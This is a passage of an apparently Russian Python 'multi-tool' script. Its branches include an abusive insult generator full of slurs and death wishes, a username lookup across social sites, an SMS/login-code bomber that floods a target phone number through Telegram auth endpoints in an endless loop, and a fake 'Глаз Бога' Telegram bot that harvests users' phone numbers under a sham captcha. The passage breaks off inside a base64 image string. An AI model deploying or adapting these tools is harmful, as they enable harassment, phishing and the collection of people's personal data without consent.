                    "Ты, ошибка эволюции,", "Послушай, недоразумение природы,",
                    "Ты, позор человечества,", "Эй, дегенеративная форма жизни,",
                    "Ты, мутант недоделанный,", "Слышь, космический мусор,"
                ]

                self.troll1 = [
                    "ебанный", "выебанный", "припизднутый", "без мамный", "слабоумный", "никчемный",
                    "тупой", "тупорылый", "конченый", "уебищный", "опущенный", "пидорский",
                    "жалкий", "гнилой", "вонючий", "уродливый", "дегенеративный",
                    "вшивый", "засранный", "протухший", "заплесневелый", "убогий",
                    "безмозглый", "недоразвитый", "скудоумный", "дефективный",
                    "слабохарактерный", "неполноценный", "умственно-отсталый",
                    "генетически-дефектный", "душевнобольной", "психически-нестабильный",
                    "социально-деградированный", "морально-разложившийся", "интеллектуально-ограниченный",
                    "эволюционно-отсталый", "мутантно-деформированный", "биологически-неполноценный"
                ]

                self.troll2 = [
                    "ишак", "осел", "даун", "ослик", "хуесос", "пиздабол", "ебанный сыр",
                    "глиномес", "залупа", "говноед", "пидорас", "сука", "мудак",
                    "чмо", "уёбок", "выродок", "падаль", "тварь", "хуйня",
                    "мразота", "генетический мусор", "биологический сбой",
                    "ошибка природы", "недоразумение эволюции", "мутант",
                    "дегенерат", "отброс общества", "паразит",
                    "биомусор", "генетический брак", "ублюдок природы",
                    "урод генетический", "шлак эволюции", "мусор человечества",
                    "паразит общества", "биологическая ошибка", "генетическая катастрофа",
                    "эволюционный тупик", "социальная раковая опухоль"
                ]

                self.troll3 = [
                    "ничем не отличается от", "не отличается по уму от", "не отличается от",
                    "такой же как", "как две капли похож на", "один в один как",
                    "копия", "точная копия", "реинкарнация", "клон", "как говно на",
                    "хуже чем", "омерзительнее чем", "более никчемный чем",
                    "более тупой чем", "более жалкий чем", "гаже чем",
                    "более мерзкий чем", "более вонючий чем", "более убогий чем",
                    "более дегенеративный чем", "более тошнотворный чем",
                    "более отвратительный чем", "более ничтожный чем",
                    "более презренный чем", "более уродливый чем"
                ]

                self.troll4 = [
                    "ебанной шлюхи", "коровы", "собаки", "шлюхи", "проститутки", "швали", "мухи",
                    "крысы", "обезьяны", "гориллы", "бляди", "овцы", "гниды",
                    "таракана", "червяка", "блохи", "вши", "клопа", "слизняка",
                    "протухшего трупа", "гниющей падали", "разлагающейся туши",
                    "кучи компоста", "сточной канавы", "выгребной ямы",
                    "мусорной кучи", "помойного ведра", "сгнившего мяса",
                    "протухшей рыбы", "прокисшего молока", "заплесневелого хлеба",
                    "использованного презерватива", "грязного памперса", "свиного корыта",
                    "общественного туалета", "канализационного стока"
                ]

                self.troll5 = [
                    "отца твоего", "мать твою", "всю родню твою", "тебя",
                    "твою бабушку", "твоего деда", "твоих предков", "твоих детей",
                    "твоих соседей", "твоего кота", "твою собаку", "твоего хомячка",
                    "всю твою генетическую линию", "твой род проклятый",
                    "твоё семейное древо гнилое", "твою родословную проклятую",
                    "твоих будущих детей", "твоих потомков", "твою династию",
                    "твой генетический код", "твою ДНК мутировавшую",
                    "твоих предков до седьмого колена", "твоё потомство",
                    "твою семейную честь", "твой фамильный герб", "твою кровь"
                ]

                self.troll6 = [
                    "весь двор", "весь район", "весь город", "вся страна", "весь мир",
                    "каждые вторые челики", "каждые третие челики", "все бомжи", "все алкаши",
                    "все дебилы", "все пидорасы", "все наркоманы", "все тупые мрази", "все нищеброды",
                    "все представители низшего общества", "вся генетическая помойка",
                    "все отбросы эволюции", "все мутанты района", "все деграданты",
                    "вся биологическая грязь", "все паразиты общества",
                    "весь генетический мусор", "все дегенераты планеты",
                    "вся социальная раковая опухоль", "все ошибки природы",
                    "все представители низшей касты", "вся биологическая плесень"
                ]

                self.troll7 = [
                    "ебали", "трахали", "ногами пиздили", "до крови избивали",
                    "на колени ставили", "плювали в лицо", "в жопу драли", "на хуй сажали",
                    "заставляли хуй сосать", "говном мазали", "ебали в рот", "срали в рот",
                    "мочой поливали", "в дерьме купали", "говном кормили",
                    "как тряпку использовали", "как мусор выбрасывали",
                    "как отброс общества презирали", "ногами топтали",
                    "как грязь под ногами считали", "как биомусор утилизировали",
                    "в помойку выкидывали", "как генетический мусор сортировали",
                    "на опыты брали", "как подопытных крыс использовали",
                    "в зоопарке показывали", "в цирке уродов выставляли"
                ]

                self.troll_end = [
                    "и это ещё мягко сказано!", "иди нахуй, мразь!", "заткнись, говно!",
                    "ты хуже говна!", "ты ебаный ублюдок!", "ты кусок дерьма!", "сдохни, сука!",
                    "я тебя ненавижу, пидор!", "я тебе ебало разобью!", "ты меня заебал, тупая пизда!",
                    "ты биологический мусор!", "тебя природа обсерала!",
                    "ты генетическая катастрофа!", "тебя эволюция прокляла!",
                    "ты позор человечества!", "тебя даже черви не съедят!",
                    "ты даже для опарышей слишком мерзкий!", "твоё ДНК просит о смерти!",
                    "твои гены молят о забвении!", "ты ошибка матери-природы!",
                    "тебя даже инфузории презирают!", "твоя генетика просит эвтаназии!",
                    "ты биологическая аномалия!", "тебя наука отвергает!",
                    "ты эволюционный тупик!", "твоё существование - ошибка!"
                ]

                self.troll_conclusion = [
                    "В заключение скажу, ты - полное дерьмо!", "Итак, подведём итог: ты - ничто!",
                    "В конце концов, ты - просто мусор!", "Короче, ты - кусок говна!",
                    "Заканчивая, скажу: ты - жалкая мразь!", "И напоследок: ты - конченый уёбок!",
                    "В завершение: ты хуже дерьма!", "И в конце: ты заслуживаешь смерти!",
                    "Подводя итог: ты - генетическая катастрофа!",
                    "Заключительный вердикт: ты - ошибка эволюции!",
                    "Финальный диагноз: ты - биологический мусор!",
                    "В итоге: твоё существование - насмешка природы!",
                    "Окончательный вывод: ты - мутант недоделанный!",
                    "Резюмируя: ты - позор человеческого рода!",
                    "Финальное заключение: ты - генетический брак!",
                    "Последний штрих: природа на тебе отдохнула!",
                    "В завершение скажу: ты - биологическая ошибка!",
                    "Итоговый вердикт: тебя даже червям противно жрать!",
                    "Окончательный приговор: ты - эволюционный тупик!",
                    "Последнее слово: тебя даже бактерии презирают!"
                ]

                self.troll_intelligence = [
                    "с интеллектом ниже табуретки", "с мозгом размером с горошину",
                    "с IQ комнатного растения", "с мышлением амёбы",
                    "умственно ограниченный как пробка", "с интеллектом табуретки",
                    "с мозговой активностью кактуса", "с мыслительным процессом улитки",
                    "с когнитивными способностями табуретки", "с разумом инфузории-туфельки",
                    "с интеллектом на уровне плинтуса", "с мозгами из опилок"
                ]

                self.troll_biology = [
                    "с гнилыми генами", "с мутировавшей ДНК", "с бракованной хромосомой",
                    "с дефектным геномом", "с испорченным генофондом",
                    "с генетическим сбоем", "с биологическим браком",
                    "с нарушенной эволюцией", "с дегенеративными признаками",
                    "с атрофированным мозгом", "с деформированной сущностью",
                    "с врождённой тупостью", "с наследственной глупостью"
                ]
                self.troll_social = [
                    "социально деградировавший", "общественно бесполезный",
                    "морально разложившийся", "культурно отсталый",
                    "духовно опустошённый", "интеллектуально обанкротившийся",
                    "этически деградировавший", "ментально деградировавший",
                    "личностно несостоявшийся", "психически неполноценный"
                ]

                self.troll_curse = [
                    "чтоб твои гены сгнили", "чтоб твоя ДНК распалась",
                    "чтоб твой род пресёкся", "чтоб твои хромосомы рассыпались",
                    "чтоб твоя эволюция закончилась", "чтоб твой генофонд иссяк",
                    "чтоб твоя биология прекратилась", "чтоб твоя наследственность умерла",
                    "чтоб твоя генетическая линия оборвалась", "чтоб твой геном мутировал"
                ]

            def generate(self):
                intro = random.choice(self.troll_intro)
                start = random.choice(self.troll_start)
                troll1_1 = random.choice(self.troll1)
                troll1_2 = random.choice(self.troll1)
                troll1_3 = random.choice(self.troll1)
                troll1_4 = random.choice(self.troll1)
                troll2_1 = random.choice(self.troll2)
                troll2_2 = random.choice(self.troll2)
                troll2_3 = random.choice(self.troll2)
                troll2_4 = random.choice(self.troll2)
                troll3_1 = random.choice(self.troll3)
                troll3_2 = random.choice(self.troll3)
                troll4_1 = random.choice(self.troll4)
                troll4_2 = random.choice(self.troll4)
                troll5_1 = random.choice(self.troll5)
                troll5_2 = random.choice(self.troll5)
                troll6_1 = random.choice(self.troll6)
                troll6_2 = random.choice(self.troll6)
                troll7_1 = random.choice(self.troll7)
                troll7_2 = random.choice(self.troll7)

                intelligence = random.choice(self.troll_intelligence)
                biology = random.choice(self.troll_biology)
                social = random.choice(self.troll_social)
                curse = random.choice(self.troll_curse)

                end = random.choice(self.troll_end)
                conclusion = random.choice(self.troll_conclusion)

                message = f"{intro} {start} "
                message += f"Ты {troll1_1} {troll2_1}, {troll1_2} {troll2_2}, {troll1_3} {troll2_3} и {troll1_4} {troll2_4}, "
                message += f"который {troll3_1} {troll4_1} и {troll3_2} {troll4_2}, "
                message += f"{intelligence}, {biology} и {social}, "
                message += f"как и {troll5_1} и {troll5_2}, "
                message += f"которых {troll6_1} и {troll6_2} {troll7_1} и {troll7_2}! "
                message += f"{curse}! {end} {conclusion}"

                return message

        def main():
            generator = TrollGenerator()
            while True:
                print("\nСгенерированное оскорбление:")
                print("#" * 700)
                print(generator.generate())
                print("#" * 700)

                choice = input("\nСгенерировать ещё одно сообщение? (y/n): ").lower()
                if choice != 'y':
                    break

        if __name__ == "__main__":
            main()
        return False

    elif choice == "14":
        import requests

        def check_username_format(username):
            if not username.isalnum():
                return False
            return True

        def check_sites(username):
            if not check_username_format(username):
                print("Пожалуйста, используйте только буквы и цифры для никнейма")
                return

            sites = [
                "https://playerok.com/profile/{username}/products",
                "https://www.youtube.com/@{username}/",
                "https://github.com/{username}",
                "https://www.reddit.com/user/{username}",
                "https://www.linkedin.com/in/{username}/",
                "https://vk.com/{username}",
                "https://www.snapchat.com/add/{username}",
                "https://www.deviantart.com/{username}",
                "https://www.flickr.com/people/{username}/",
                "https://www.quora.com/profile/{username}",
                "https://www.behance.net/{username}",
                "https://www.dribbble.com/{username}"
            ]

            print("\nСайты на которых зарегистрирован пользователь:")
            print("-" * 40)
            for site in sites:
                web = site.format(username=username)
                try:
                    response = requests.get(web)
                    if response.status_code == 200:
                        print(web)
                except requests.exceptions.RequestException as e:
                    print(f"Ошибка при запросе к {web}: {e}")

        def main():
            while True:
                username = input("Введите никнейм для поиска (или 'q' для выхода): ").strip()

                if username.lower() == 'q':
                    print("Программа завершена")
                    break

                if username:
                    check_sites(username)
                else:
                    print("Пожалуйста, введите никнейм")

        if __name__ == "__main__":
            main()
        return False

    elif choice == "2":
        import requests
        import fake_useragent
        import time
        number = int(input("Введите номер телефона: "))
        count = 0

        try:
            while True:
                user = fake_useragent.UserAgent().random
                headers = {'user-agent': user}

                urls = [
                    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                    'https://translations.telegram.org/auth/request',
                    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
                    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                    'https://my.telegram.org/auth/send_password'
                ]

                for url in urls:
                    time.sleep(0.5)
                    requests.post(url, headers=headers, data={'phone': number})

                count += 1

                print(f"Коды успешно отправлены")
                print(f"Всего циклов: {count} ")
        except Exception as e:
            print('Ошибка, проверьте вводимые данные:')
        return False

    elif choice == "3":
        from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
        from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
        import logging
        import sys

        logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
        logger = logging.getLogger(__name__)

        async def start(update: Update, context: CallbackContext) -> None:
            keyboard = [[KeyboardButton("✅ Подтвердить", request_contact=True)]]
            reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)

            await update.message.reply_text("""
        🗂 Добро пожаловать в поисковую систему глаза бога!
        Сервис является инструментом по поиску информации о физических и юридических лицах и использует для поиска открытые и общедоступные банки данных.
        Сервис работает в режиме реального времени и формирует отчёт «на ходу», то есть без сохранения всей полученной из банков данных информации.
        Пожалуйста подтвердите номер телефона чтобы пройти капчу""", reply_markup=reply_markup)

        async def handle_contact(update: Update, context: CallbackContext) -> None:
            user = update.message.from_user
            contact = update.message.contact

            print(
                f"Новый пользователь попал в базу: [@{user.username}], [{contact.phone_number}], [{user.id}], [{user.last_name} {user.first_name}]")

            await update.message.reply_text('venom')

        def main():
            if len(sys.argv) > 1:
                token = sys.argv[1]
            else:
                token = input("Введите токен вашего Telegram бота: ")

            if not token or ':' not in token:
                print("Ошибка: Некорректный токен бота!")
                print("Токен должен быть получен у @BotFather и содержать цифры и символ ':'")
                sys.exit(1)

            try:
                application = Application.builder().token(token).build()

                application.add_handler(CommandHandler("start", start))
                application.add_handler(MessageHandler(filters.CONTACT, handle_contact))

                application.run_polling(drop_pending_updates=True)

            except Exception as e:
                print(f"Ошибка при запуске бота: {e}")
                print("Проверьте корректность токена и подключение к интернету")
                sys.exit(1)

        if __name__ == '__main__':
            main()
        return False
    elif choice == "4":
        import sys
        import random
        import json
        import os
        import base64
        from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QLabel
        from PyQt6.QtCore import Qt, QTimer
        from PyQt6.QtGui import QPainter, QColor, QImage, QPalette
        from base64 import b64decode
        OMNOM_BASE64 = "iVBORw0KGgoAAAANSUhEUgAAAjQAAAI8CAYAAADm2DFuAAAAAXNSR0IB2cksfwAAAAlwSFlzAAALEwAACxMBAJqcGAAAx7BJREFUeJzs3QdYVFfiPv7BFruooKgogihIU0HFht303qvG9N42VY0t9oYivfdeZpgBhg4qsSTGFGNMjDHNTdlNdjfZ8tv973ff/z2HYBRnYAamUN7P85xHbHBn7p1z33uqSkVEREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREZAZYoBARERHZhSWCDIMNERER2ZzJ4WTMuBFwdRuB3n0dGGiIiIiowzAYQq7o1xu9r3DAyFHDMHa8C1zHj8DocY4YNXYwxowfgrHuw+A2wQnjPUdi/ISRGOcxAmPcnODsMhjOIwcz1BAREZHVGW1NGTd+DEa5OsNp5CD0G6JCj/7Kn/e9qCi/dxisQh9HFfo7qTDQWYXBI1UYohRHpQwfpYSgMf2V8DNcCTdD2WJDREREVnNZyBjsOACu410w3GUQeg9S/qx3s3/TU4Ul61R4+nDLRYScpv8zaGhvjBhlMNQQERERtdll4UK0xogupRGjh6D/UBV6DvytJaaPCg9qWw8whkrznzFg0BVsqSEiIiKLuCxQjB0/Ei6uQzDIyQG9Bit/NrBtAcZQGRvMwcJERERkWZcEif6De8PV3QkDhjeGGNUAywWZlkJNrz49GGyIiIioTS4JD84uQ5QwM0wO5FUNsk6QaSnUDBwykIGGiIiIzHLpDCb3kRjj7oh+I5TfO1o/zBgLNUMcBzHUEBERkckuBIbR45zg6uEIx9G2CzJGx9P0YLcTERERte7S1X3dnDB2giMGutg+zBgLNUOHOzLQEBERUYsu7WryHIoh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